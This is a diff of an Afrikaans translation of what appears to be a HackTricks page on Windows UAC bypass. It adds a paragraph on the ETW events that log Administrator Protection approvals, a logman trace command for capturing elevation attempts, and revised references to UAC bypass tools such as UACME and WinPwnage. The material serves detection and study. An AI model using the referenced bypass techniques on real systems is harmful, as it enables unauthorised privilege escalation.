+Op preview-gashere teken Administrator Protection goedkeurings en mislukkings as ETW-gebeurtenisse **15031** en **15032** onder die `Microsoft-Windows-LUA`-verskaffer aan. Die gebeurtenisse bevat die aanvraer se SID, toepassingspad, uitslag, bestuurde administrateurrekening en verifikasiemetode, dus lewer herhaalde uitbuitingspogings of mislukte UI-beheer steeds telemetrie op.<sup>[[10]](#references)</sup>
+
 ```cmd
 logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
 rem reproduce the elevation attempt
 logman stop AdminProtectionTrace -ets
 ```
+
+
+
 ## References
 
 - [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
-- [2] [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [2] [Microsoft Docs – Hoe Gebruikersrekeningbeheer werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
 - [3] [UACME – Versameling UAC bypass-tegnieke](https://github.com/hfiref0x/UACME)
-- [4] [WinPwnage – UAC bypass-versoenbaarheidskandeerder en lanseerder](https://github.com/rootm0s/WinPwnage)
-- [5] [Checkpoint Research – KONNI gebruik AI om PowerShell-backdoors te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [6] [Check Point Research – Operasie TrueChaos: 0-Day-ontginning teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [7] [Project Zero – Om Windows-administrateurbeskerming te omseil](https://projectzero.google/2026/26/windows-administrator-protection.html)
-- [8] [Sigma / Detection.FYI – Om UAC te omseil met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
-- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- en Narrator-omseilings met Always Notify](https://github.com/hfiref0x/UACME/issues/173)
-- [10] [Microsoft Learn – Administrateurbeskerming](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
-- [11] [Google Project Zero – Roep plaaslike Windows RPC-bedieners vanuit .NET aan](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
+- [4] [WinPwnage – UAC bypass-versoenbaarheidsskandeerder en lanseerder](https://github.com/rootm0s/WinPwnage)
+- [5] [Checkpoint Research – KONNI gebruik AI om PowerShell-agterdeure te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [6] [Check Point Research – Operasie TrueChaos: 0-Day-uitbuiting teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [7] [Project Zero – Omseiling van Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [8] [Sigma / Detection.FYI – Omseil UAC met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
+- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- en Narrator-omseilings van Always Notify](https://github.com/hfiref0x/UACME/issues/173)
+- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
+- [11] [Google Project Zero – Roep plaaslike Windows RPC-bedieners vanaf .NET aan](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
 - [12] [Kaspersky Securelist – HoneyMyte verbeter CoolClient met ’n ondertekende Windows-kernrootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
+- [13] [Group-IB – KGB RAT: ’n Volledig onopspoorbare Windows-trojaan wat ontwerp is om te spioeneer, te steel en te terroriseer](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
+- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
 {{#include ../../banners/hacktricks-training.md}}
